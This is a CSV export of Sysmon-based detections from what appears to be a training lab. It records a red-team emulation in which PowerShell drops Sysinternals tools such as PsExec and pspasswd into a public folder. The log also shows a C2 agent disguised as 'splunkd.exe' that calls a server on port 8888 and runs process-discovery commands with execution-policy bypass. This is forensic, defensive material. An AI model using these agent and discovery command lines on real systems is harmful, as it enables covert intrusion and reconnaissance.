"Timestamp","RuleTitle","Level","Computer","Channel","EventID","MitreTactics","MitreTags","OtherTags","RecordID","Details","ExtraFieldInfo","RuleFile","RuleID","EvtxFile"
"2025-12-23 14:26:38.707 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",172737,"Rule: EXE ¦ Path: C:\Users\Public\temp\PsLoggedon64.exe ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 2592 ¦ PGUID: E9F06A57-9888-694A-EF02-000000002300","CreationUtcTime: 2025-12-23 13:26:38.705 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-23 13:26:38.705","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\mc_enum.evtx"
"2025-12-23 14:26:38.729 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",172738,"Rule: EXE ¦ Path: C:\Users\Public\temp\psping.exe ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 2592 ¦ PGUID: E9F06A57-9888-694A-EF02-000000002300","CreationUtcTime: 2025-12-23 13:26:38.728 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-23 13:26:38.728","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\mc_enum.evtx"
"2025-12-23 14:26:38.753 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",172739,"Rule: EXE ¦ Path: C:\Users\Public\temp\psping64.exe ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 2592 ¦ PGUID: E9F06A57-9888-694A-EF02-000000002300","CreationUtcTime: 2025-12-23 13:26:38.752 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-23 13:26:38.752","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\mc_enum.evtx"
"2025-12-23 14:26:38.778 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",172740,"Rule: EXE ¦ Path: C:\Users\Public\temp\psshutdown.exe ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 2592 ¦ PGUID: E9F06A57-9888-694A-EF02-000000002300","CreationUtcTime: 2025-12-23 13:26:38.776 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-23 13:26:38.776","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\mc_enum.evtx"
"2025-12-23 14:26:38.805 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",172741,"Rule: EXE ¦ Path: C:\Users\Public\temp\psshutdown64.exe ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 2592 ¦ PGUID: E9F06A57-9888-694A-EF02-000000002300","CreationUtcTime: 2025-12-23 13:26:38.804 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-23 13:26:38.804","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\mc_enum.evtx"
"2025-12-23 14:26:38.834 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",172742,"Rule: EXE ¦ Path: C:\Users\Public\temp\psfile.exe ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 2592 ¦ PGUID: E9F06A57-9888-694A-EF02-000000002300","CreationUtcTime: 2025-12-23 13:26:38.833 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-23 13:26:38.833","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\mc_enum.evtx"
"2025-12-23 14:26:38.858 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",172743,"Rule: EXE ¦ Path: C:\Users\Public\temp\psfile64.exe ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 2592 ¦ PGUID: E9F06A57-9888-694A-EF02-000000002300","CreationUtcTime: 2025-12-23 13:26:38.857 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-23 13:26:38.857","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\mc_enum.evtx"
"2025-12-23 14:26:38.882 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",172744,"Rule: EXE ¦ Path: C:\Users\Public\temp\PsGetsid.exe ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 2592 ¦ PGUID: E9F06A57-9888-694A-EF02-000000002300","CreationUtcTime: 2025-12-23 13:26:38.881 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-23 13:26:38.881","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\mc_enum.evtx"
"2025-12-23 14:26:38.908 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",172745,"Rule: EXE ¦ Path: C:\Users\Public\temp\PsGetsid64.exe ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 2592 ¦ PGUID: E9F06A57-9888-694A-EF02-000000002300","CreationUtcTime: 2025-12-23 13:26:38.906 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-23 13:26:38.906","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\mc_enum.evtx"
"2025-12-23 14:26:38.934 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",172746,"Rule: EXE ¦ Path: C:\Users\Public\temp\PsInfo.exe ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 2592 ¦ PGUID: E9F06A57-9888-694A-EF02-000000002300","CreationUtcTime: 2025-12-23 13:26:38.932 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-23 13:26:38.934","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\mc_enum.evtx"
"2025-12-23 14:26:38.960 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",172747,"Rule: EXE ¦ Path: C:\Users\Public\temp\PsInfo64.exe ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 2592 ¦ PGUID: E9F06A57-9888-694A-EF02-000000002300","CreationUtcTime: 2025-12-23 13:26:38.958 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-23 13:26:38.958","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\mc_enum.evtx"
"2025-12-23 14:26:38.986 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",172748,"Rule: EXE ¦ Path: C:\Users\Public\temp\pskill.exe ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 2592 ¦ PGUID: E9F06A57-9888-694A-EF02-000000002300","CreationUtcTime: 2025-12-23 13:26:38.985 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-23 13:26:38.985","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\mc_enum.evtx"
"2025-12-23 14:26:39.011 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",172749,"Rule: EXE ¦ Path: C:\Users\Public\temp\pskill64.exe ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 2592 ¦ PGUID: E9F06A57-9888-694A-EF02-000000002300","CreationUtcTime: 2025-12-23 13:26:39.011 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-23 13:26:39.011","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\mc_enum.evtx"
"2025-12-23 14:26:39.035 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",172750,"Rule: EXE ¦ Path: C:\Users\Public\temp\pslist.exe ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 2592 ¦ PGUID: E9F06A57-9888-694A-EF02-000000002300","CreationUtcTime: 2025-12-23 13:26:39.033 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-23 13:26:39.033","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\mc_enum.evtx"
"2025-12-23 14:26:39.058 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",172751,"Rule: EXE ¦ Path: C:\Users\Public\temp\pslist64.exe ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 2592 ¦ PGUID: E9F06A57-9888-694A-EF02-000000002300","CreationUtcTime: 2025-12-23 13:26:39.057 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-23 13:26:39.057","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\mc_enum.evtx"
"2025-12-23 14:26:39.083 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",172752,"Rule: EXE ¦ Path: C:\Users\Public\temp\psloglist.exe ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 2592 ¦ PGUID: E9F06A57-9888-694A-EF02-000000002300","CreationUtcTime: 2025-12-23 13:26:39.080 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-23 13:26:39.080","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\mc_enum.evtx"
"2025-12-23 14:26:39.097 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",172753,"Rule: EXE ¦ Path: C:\Users\Public\temp\psloglist64.exe ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 2592 ¦ PGUID: E9F06A57-9888-694A-EF02-000000002300","CreationUtcTime: 2025-12-23 13:26:39.096 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-23 13:26:39.096","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\mc_enum.evtx"
"2025-12-23 14:26:39.109 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",172754,"Rule: EXE ¦ Path: C:\Users\Public\temp\pspasswd.exe ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 2592 ¦ PGUID: E9F06A57-9888-694A-EF02-000000002300","CreationUtcTime: 2025-12-23 13:26:39.107 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-23 13:26:39.107","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\mc_enum.evtx"
"2025-12-23 14:26:39.118 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",172755,"Rule: EXE ¦ Path: C:\Users\Public\temp\pspasswd64.exe ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 2592 ¦ PGUID: E9F06A57-9888-694A-EF02-000000002300","CreationUtcTime: 2025-12-23 13:26:39.116 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-23 13:26:39.116","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\mc_enum.evtx"
"2025-12-23 14:26:39.129 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",172756,"Rule: EXE ¦ Path: C:\Users\Public\temp\PsService.exe ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 2592 ¦ PGUID: E9F06A57-9888-694A-EF02-000000002300","CreationUtcTime: 2025-12-23 13:26:39.127 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-23 13:26:39.127","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\mc_enum.evtx"
"2025-12-23 14:26:39.142 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",172757,"Rule: EXE ¦ Path: C:\Users\Public\temp\PsService64.exe ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 2592 ¦ PGUID: E9F06A57-9888-694A-EF02-000000002300","CreationUtcTime: 2025-12-23 13:26:39.137 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-23 13:26:39.137","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\mc_enum.evtx"
"2025-12-23 14:26:39.150 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",172758,"Rule: EXE ¦ Path: C:\Users\Public\temp\pssuspend.exe ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 2592 ¦ PGUID: E9F06A57-9888-694A-EF02-000000002300","CreationUtcTime: 2025-12-23 13:26:39.146 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-23 13:26:39.148","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\mc_enum.evtx"
"2025-12-23 14:26:39.165 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",172759,"Rule: EXE ¦ Path: C:\Users\Public\temp\pssuspend64.exe ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 2592 ¦ PGUID: E9F06A57-9888-694A-EF02-000000002300","CreationUtcTime: 2025-12-23 13:26:39.158 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-23 13:26:39.160","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\mc_enum.evtx"
"2025-12-23 14:26:39.175 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",172760,"Rule: EXE ¦ Path: C:\Users\Public\temp\PsExec.exe ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 2592 ¦ PGUID: E9F06A57-9888-694A-EF02-000000002300","CreationUtcTime: 2025-12-23 13:26:39.172 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-23 13:26:39.172","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\mc_enum.evtx"
"2025-12-23 14:26:39.189 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",172761,"Rule: EXE ¦ Path: C:\Users\Public\temp\PsExec64.exe ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 2592 ¦ PGUID: E9F06A57-9888-694A-EF02-000000002300","CreationUtcTime: 2025-12-23 13:26:39.187 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-23 13:26:39.187","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\mc_enum.evtx"
"2025-12-23 14:23:21.326 +01:00","Proc Exec","info","DESKTOP-G2OBL3D","Sysmon",1,"","","sysmon",172719,"Cmdline: powershell.exe -ExecutionPolicy Bypass -C ""wmic process get executablepath,name,processid,parentprocessid >> $env:APPDATA\vmtools.log;cat $env:APPDATA\vmtools.log"" ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\Users\Public\splunkd.exe"" -server http://192.168.201.129:8888 -group red ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 7612 ¦ PGUID: E9F06A57-97C9-694A-E902-000000002300 ¦ ParentPID: 2972 ¦ ParentPGUID: E9F06A57-8EA3-694A-5C02-000000002300 ¦ Description: Windows PowerShell ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=909A2EEC5534F01DFF87B7D47E57BFF7,SHA256=D3B4B97C2BF97D70E5655FF4C4CA1D8CEF9DED51685CFD764247CFDA98EE68DF,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77","CurrentDirectory: C:\WINDOWS\system32\ ¦ FileVersion: 10.0.26100.1 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: PowerShell.EXE ¦ ParentImage: C:\Users\Public\splunkd.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 13:23:21.320","Sysmon_1_Info_ProcExec.yml","85790e3e-e270-499f-a6ad-f8afe85c35f1","C:\Tools\Logs\mc_enum.evtx"
"2025-12-23 14:24:03.202 +01:00","Proc Exec","info","DESKTOP-G2OBL3D","Sysmon",1,"","","sysmon",172721,"Cmdline: powershell.exe -ExecutionPolicy Bypass -C ""tasklist /m >> $env:APPDATA\vmtool.log;cat $env:APPDATA\vmtool.log"" ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\Users\Public\splunkd.exe"" -server http://192.168.201.129:8888 -group red ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 2188 ¦ PGUID: E9F06A57-97F3-694A-EA02-000000002300 ¦ ParentPID: 2972 ¦ ParentPGUID: E9F06A57-8EA3-694A-5C02-000000002300 ¦ Description: Windows PowerShell ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=909A2EEC5534F01DFF87B7D47E57BFF7,SHA256=D3B4B97C2BF97D70E5655FF4C4CA1D8CEF9DED51685CFD764247CFDA98EE68DF,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77","CurrentDirectory: C:\WINDOWS\system32\ ¦ FileVersion: 10.0.26100.1 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: PowerShell.EXE ¦ ParentImage: C:\Users\Public\splunkd.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 13:24:03.200","Sysmon_1_Info_ProcExec.yml","85790e3e-e270-499f-a6ad-f8afe85c35f1","C:\Tools\Logs\mc_enum.evtx"
